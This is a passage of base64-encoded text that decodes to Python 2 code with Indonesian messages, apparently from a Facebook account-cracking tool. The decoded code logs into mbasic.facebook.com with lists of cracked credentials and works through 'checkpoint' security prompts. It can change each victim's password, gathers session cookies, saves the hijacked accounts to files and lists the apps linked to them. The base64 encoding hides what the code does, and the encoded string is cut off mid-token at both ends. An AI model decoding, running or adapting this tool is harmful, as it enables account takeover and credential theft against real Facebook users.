hbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6ICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIob3B0KzEpLEssbmdld1tvcHRdKSkNCiAgICAgICAgICAgIGlmICIwIiBpbiBzdHIobGVuKG5nZXcpKToNCiAgICAgICAgICAgIAlpZiAiTGloYXQgZGV0YWlsIGxvZ2luIHlhbmcgZGl0YW1waWxrYW4uIEluaSBBbmRhPyIgaW4gdGl0bGU6DQogICAgICAgICAgICAJICAgIGNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICAgICAgICAgICAgICAgICAgaWYgInViYWgiIGluIHNlbGYudWJhaF9wYXNzOg0KICAgICAgICAgICAgICAgICAgICAJc2VsZi51YmFoX3B3KHVpZCxwdyxzZXMscnVuLGxpbmsyKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPiiJogYWt1biBvbmUgdGFiLCBzaWxhaGthbiBhbmRhIGxvZ2luICAgICIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIFxuIiUgKHVpZCxwdykpDQogICAgICAgICAgICAgICAgZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlc8OXIGFrdW4gdGVycGFzYW5nIGF1dGVudGlmaWthc2kgMiBmYWt0b3IgICAiJShNKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgdGVya2VuYSBzcGFtLCBtb2RlIHBlc2F3YXRrYW4gMiBkZXRpayAgICIlKE0pKQ0KICAgICAgICAgICAgcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgZWxpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIgICAgICAlc+KImiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gICAiJShIKSkNCiAgICAgICAgCXByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIAlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMgXG4iJSAodWlkLHB3KSkNCiAgICAgICAgZWxpZiAibG9naW5fZXJyb3IiIGluIHN0cihydW4pOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgIGRlZiB1YmFoX3B3KHNlbGYsdWlkLHB3LHNlcyxydW4sbGluazIpOg0KICAgIAlkYXQsZGF0Mj17fSx7fQ0KICAgIAlidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgICAgICBmb3IgeCBpbiBydW4oImlucHV0Iik6DQogICAgICAgIAlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCiAgICAgICAgCSAgICBkYXQudXBkYXRlKHt4LmdldCgibmFtZSIpOnguZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgdWJhaFB3PXNlcy5wb3N0KHNlbGYudXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCiAgICAgICAgcmVzVWJhaD1wYXJzZXIodWJhaFB3LCJodG1sLnBhcnNlciIpDQogICAgICAgIGxpbmszPXJlc1ViYWguZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgIGJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCiAgICAgICAgaWYgIkJ1YXQgS2F0YSBTYW5kaSBCYXJ1IiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodWJhaFB3KSk6DQogICAgICAgIAlmb3IgYiBpbiByZXNVYmFoKCJpbnB1dCIpOg0KICAgICAgICAJICAgIGlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCiAgICAgICAgCSAgICAgICAgZGF0Mi51cGRhdGUoe2IuZ2V0KCJuYW1lIik6Yi5nZXQoInZhbHVlIil9KQ0KICAgICAgICAJZGF0Mi51cGRhdGUoeyJwYXNzd29yZF9uZXciOiIiLmpvaW4oc2VsZi5wd2JhcnUpfSkNCiAgICAgICAgCWFuPXNlcy5wb3N0KHNlbGYudXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KICAgICAgICAJY29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KICAgICAgICAJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNhbmRpIGJlcmhhc2lsIGRpIHViYWggXG4gKi0tPiAlcyDil4ogJXMg4peKICVzCQkJIiUoSCx0aWwsdWlkLHNlbGYucHdiYXJ1WzBdLGNva2kpKQ0KICAgICAgICAJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1aWQsc2VsZi5wd2JhcnVbMF0sY29raSkpDQogICAgICAgIAlzZWxmLmFwbGlrYXNpKGNva2kpDQogICAgZGVmIGFwbGlrYXNpKHNlbGYsa3VraSk6DQogICAgICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICBydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQogICAgICAgIHJ1bl8gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIikNCiAgICAgICAgb3R3ID0gc2VzLmdldChydW4sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIG90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIGdlbSA9IHBhcnNlcihvdHcuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBnZW1fID0gcGFyc2VyKG90d18uY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgYXBrXyA9IGdlbV8uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgbm8gPSAwDQogICAgICAgIG5vXyA9IDANCiAgICAgICAgdHJ5Og0KICAgICAgICAJZm9yIGFwcCBpbiBhcGsuZmluZF9hbGwoImgzIik6DQogICAgICAgIAkgICAgZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vKz0xDQogICAgICAgIAkgICAgc2VsZi5nbS5hcHBlbmQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQogICAgICAgIAlmb3IgYXBwXyBpbiBhcGtfLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAJICAgIGRhdGFfID0gYXBwXy5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vXys9MQ0KICAgICAgICAJICAgIHNlbGYuZ20uYXBwZW5kKCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG5vXyksTSxkYXRhXykpDQogICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCiAgICAgICAgCXByaW50ICgiJXPigKIgZ2FnYWwgbWVuZGV0ZWtzaSIlKE0pKQ0KIyBDRUsgT1BTSSBVQkFIIFBXDQp1YmFoX3Bhc3MgPSBbXQ0KcHdiYXJ1ID0gW10NCnB3QmFydSA9IFtdDQp1cmwgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIg0KZGVmIHViYWhwdygpOg0KCWphbGFuKCIlc+KAoiVzIE1vZGUgcGVzYXdhdGthbiB0ZXJsZWJpaCBkYWh1bHUgNSBkZXRpayAiJShVLE8pKQ0KCXB3PXJhd19pbnB1dCgiXG4lcyVzJXMgdWJhaCBzYW5kaSBwYWRhIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiBwdyBpblsnJ106DQoJCXByaW50KCIlc+KAoiBpc2kgeWcgYmVuYXIga2VudG9kICIlKE0pKQ0KCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCXViYWhfcGFzcy5hcHBlbmQoInkiKQ0KCQlwdzI9cmF3X2lucHV0KCIlcyVzJXMgbWFzdWthbiBzYW5kaSAlcz4gJXMiJShVLHRpbCxPLE0sSykpDQoJCWlmIGxlbihwdzIpIDw9IDU6DQoJCQlleGl0KCIlc+KAoiBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXIgIiUoTSkpDQoJCWVsc2U6DQoJCQlwd2JhcnUuYXBwZW5kKHB3MikNCgllbHNlOg0KCQlwYXNzDQpkZWYgZmlsZV9jcCgpOg0KICAgIGRpcnMgPSBvcy5saXN0ZGlyKCdDUCcpDQogICAgcHJpbnQgKCJcbiVz4oCiJXMgWyVzIHBpbGloIGhhc2lsIGNyYWNrIHlnIHRlcnNpbXBhbiB1bnR1ayBjZWsgb3BzaSAlc11cbiIlKFUsTyxVLE8pKQ0KICAgIGZvciBmaWxlIGluIGRpcnM6DQogICAgICAgIHByaW50KCIlc+KAoiVzPiAlcyVzIiUoVSxNLEssZmlsZSkpO2plZGEoMC4wNykNCiAgICB0cnk6DQogICAgCXByaW50KCJcbiVzJXMlcyBNYXN1a2FuIGZpbGUgWyBjdGglczogJXMlcy50eHQlcyBdIiUoVSx0aWwsTyxNLEssd2FrdHUsTykpDQogICAgICAgIG9wc2koKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAoJyVz4oCiIGZpbGUgdGlkYWsgYWRhJyUoTSkpO2V4aXQoKQ0KZGVmIG9wc2koKToNCglDUCA9ICgiQ1AvIikNCglyb21pID0gcmF3X2lucHV0KCIlcyVzJXMgTmFtYSBmaWxlICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiByb21pID09ICIiOg0KCQlwcmludCgiJXMlcyBpc2kgeWFuZyBiZW5hciAiJShNLHRpbCkpO2plZGEoMik7b3BzaSgpDQoJdHJ5Og0KCQlmaWxlX2NwID0gb3BlbihDUCtyb21pLCAiciIpLnJlYWRsaW5lcygpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoIlxuJXMlcyBuYW1hIGZpbGUgJXMgdGlkYWsgdGVyc2VkaWEiJShNLHRpbCxyb21pKSkNCgl1YmFocHcoKQ0KCXByaW50KCJcbiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCXByaW50ICgiJXMlcyVzIHRvdGFsIGFrdW4gJXM6ICVzJXMgIiUoVSx0aWwsTyxNLEssc3RyKGxlbihmaWxlX2NwKSkpKQ0KCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMiJShQLE0sUCkpO2plZGEoMikNCglub21vciA9IDANCglmb3IgZmIgaW4gZmlsZV9jcDoNCgkJYWt1biA9IGZiLnJlcGxhY2UoIlxuIiwiIikNCgkJbmdlY2VrICA9IGFrdW4uc3BsaXQoIiDil4ogIikNCgkJbm9tb3IrPTENCgkJcHJpbnQoIlxuJXMlcy4lcyBsb2dpbiBha3VuICVzPiAlcyVzIiUoSCxzdHIobm9tb3IpLE8sTSxLLGFrdW4ucmVwbGFjZSgiICotLT4gIiwiIikpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCW1lbmdlY2VrKG5nZWNla1swXS5yZXBsYWNlKCIgKi0tPiAiLCIiKSwgbmdlY2VrWzFdKQ0KCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQlwcmludCgiXHIlc+KAoiB0aWRhayBhZGEga29uZWtzaSAiJShNKSksc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJCXBhc3MNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCXByaW50KCJcbiVzJXMlcyBTZWxlc2FpIG1lbmdlY2VrIGFrdW4iJShVLHRpbCxPKSk7amVkYSgwLjA3KQ0KCXJhd19pbnB1dCgnJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKQ0KCW1lbnUoKQ0KZGF0YSA9IHt9DQpkYXRhMiA9IHt9DQpkZWYgbWVuZ2VjZWsodXNlcixwdyk6DQoJZ2xvYmFsIGxvb3AsdWJhaF9wYXNzLHB3YmFydQ0KCXNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQoJc2Vzc2lvbi5oZWFkZXJzLnVwZGF0ZSh7DQoJCSJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQoJCSJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjkiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsDQoJCSJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIg0KCX0pDQoJc291cD1wYXJzZXIoc2Vzc2lvbi5nZXQodXJsKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IikudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWxpbms9c291cC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCglmb3IgeCBpbiBzb3VwKCJpbnB1dCIpOg0KCQlkYXRhLnVwZGF0ZSh7eC5nZXQoIm5hbWUiKTp4LmdldCgidmFsdWUiKX0pDQoJZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cHd9KQ0KCXVybFBvc3Q9c2Vzc2lvbi5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2xpbmsuZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGEpDQoJcmVzcG9uc2U9cGFyc2VyKHVybFBvc3QudGV4dCwgImh0bWwucGFyc2VyIikNCglpZiAiVGVtdWthbiBBa3VuIEFuZGEiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1cmxQb3N0LnRleHQpKToNCgkJcHJpbnQoIlxyJXPigKIgbW9kZSBwZXNhd2F0a2FuIHNlbGFtYSA1IGRldGlrJXMiJShNKSkNCglpZiAiY191c2VyIiBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCgkJaWYgIkFrdW4gQW5kYSBEaWt1bmNpIiBpbiB1cmxQb3N0LnRleHQ6DQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRlcmt1bmNpIHNlc2kgbmV3IiUoTSkpDQoJCWVsc2U6DQoJCQlsb29wKz0xDQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gIiUoSCkpDQoJCQlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQoJZWxpZiAiY2hlY2twb2ludCIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCWxvb3ArPTENCgkJdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSkNCgkJbGluazI9cmVzcG9uc2UuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQoJCWxpc3RJbnB1dD1bJ2ZiX2R0c2cnLCdqYXpvZXN0JywnY2hlY2twb2ludF9kYXRhJywnc3VibWl0W0NvbnRpbnVlXScsJ25oJ10NCgkJZm9yIHggaW4gcmVzcG9uc2UoImlucHV0Iik6DQoJCQlpZiB4LmdldCgibmFtZSIpIGluIGxpc3RJbnB1dDoNCgkJCQlkYXRhMi51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhMikNCgkJcmVzcG9uc2UyPXBhcnNlcihhbi50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWNlaz1bY2VrIGZvciBjZWsgaW4gcmVzcG9uc2UyLmZpbmRfYWxsKCJvcHRpb24iKV0NCgkJbnVtYmVyPTANCgkJcHJpbnQoIlxyJXMlcyVzIHRlcmRhcGF0ICVzJXMlcyBvcHNpICVzOiIlKFUsdGlsLE8sUCxzdHIobGVuKGNlaykpLE8sTSkpO2plZGEoMC4wNykNCgkJaWYobGVuKGNlayk9PTApOg0KCQkJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KCQkJCWNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQoJCQkJaWYgInkiIGluIHViYWhfcGFzczoNCgkJCQkJdWJhaF9wdyh1c2VyLHB3LHNlc3Npb24scmVzcG9uc2UsbGluazIpDQoJCQkJZWxzZToNCgkJCQkJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNpbGFoa2FuIGFuZGEgbG9naW4JCSIlKEgsdGlsKSkNCgkJCQkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3LGNva2kpKQ0KCQkJCQlhcGxpa2FzaShjb2tpKQ0KCQkJZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0ZXJwYXNhbmcgYXV0ZW50aWthc2kgZHVhIGZha3RvcgkJCSIlKE0pKQ0KCQkJZWxzZToNCgkJCQlwcmludCgiJXMlcyB0ZXJqYWRpIGtlc2FsYWhhbiIlKE0sdGlsKSkNCgkJZWxpZihsZW4oY2VrKTw9MSk6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiBzZWxlY3RlZD1cIi4qP1wiIHZhbHVlPVwiLio/XCI+KC4qPyk8XC9vcHRpb24+JyxzdHIoY2VrKSkNCgkJCQlqYWxhbiAoIiAgJXMlcy4gJXMlcyIlKFAsc3RyKG51bWJlciksSyxvcHNpWzBdKSkNCgkJZWxpZihsZW4oY2VrKT49Mik6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiB2YWx1ZT1cIi4rXCI+KC4rKTxcL29wdGlvbj4nLHN0cihjZWtbeF0pKQ0KCQkJCWphbGFuICgiICAlcyVzLiAlcyVzIiUoUCxzdHIobnVtYmVyKSxLLG9wc2lbMF0pKQ0KCQllbHNlOg0KCQkJaWYgImNfdXNlciIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0aWRhayBjaGVja3BvaW50LCBzaWxhaGthbiBhbmRhIGxvZ2luICIlKEgpKQ0KCQkJCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCgllbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJlc3BvbnNlKToNCgkJb2ggPSBydW4uZmluZCgiZGl2Iix7ImlkIjoibG9naW5fZXJyb3IifSkuZmluZCgiZGl2IikudGV4dA0KCQlwcmludCgiJXPigKIgJXMiJShNLG9oKSkNCgllbHNlOg0KCQlsb29wKz0xDQoJCXByaW50KCIlcyVzIGxvZ2luIGdhZ2FsLCBzaWxhaGthbiBjZWsga2VtYmFsaSBpZCBkYW4ga2F0YSBzYW5kaSIlKE0sdGlsKSkNCmRlZiB1YmFoX3B3KHVzZXIscHcsc2Vzc2lvbixyZXNwb25zZSxsaW5rMik6DQoJZGF0LGRhdDI9e30se30NCglidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KCWZvciB4IGluIHJlc3BvbnNlKCJpbnB1dCIpOg0KCQlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCgkJCWRhdC51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCXViYWhQdz1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCglyZXNVYmFoPXBhcnNlcih1YmFoUHcsImh0bWwucGFyc2VyIikNCglsaW5rMz1yZXNVYmFoLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KCWJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCglpZiAiQnVhdCBLYXRhIFNhbmRpIEJhcnUiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1YmFoUHcpKToNCgkJZm9yIGIgaW4gcmVzVWJhaCgiaW5wdXQiKToNCgkJCWlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCgkJCQlkYXQyLnVwZGF0ZSh7Yi5nZXQoIm5hbWUiKTpiLmdldCgidmFsdWUiKX0pDQoJCWRhdDIudXBkYXRlKHsicGFzc3dvcmRfbmV3IjoiIi5qb2luKHB3YmFydSl9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KCQljb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KCQlwcmludCgiXHIlcyVzIGFrdW4gb25lIHRhYiwgc2FuZGkgYmVyaGFzaWwgZGkgdWJhaCBcbiAqLS0+ICVzIOKXiiAlcyDil4ogJXMJCQkiJShILHRpbCx1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJYXBsaWthc2koY29raSkNCmRlZiBhcGxpa2FzaShrdWtpKToNCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCglydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQoJcnVuXyA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiKQ0KCW90dyA9IHNlcy5nZXQocnVuLGNvb2tpZXM9eydjb29raWUnOmt1a2l9KQ0KCW90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQoJZ2VtID0gcGFyc2VyKG90dy5jb250ZW50LCdodG1sLnBhcnNlcicpDQoJZ2VtXyA9IHBhcnNlcihvdHdfLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykNCglhcG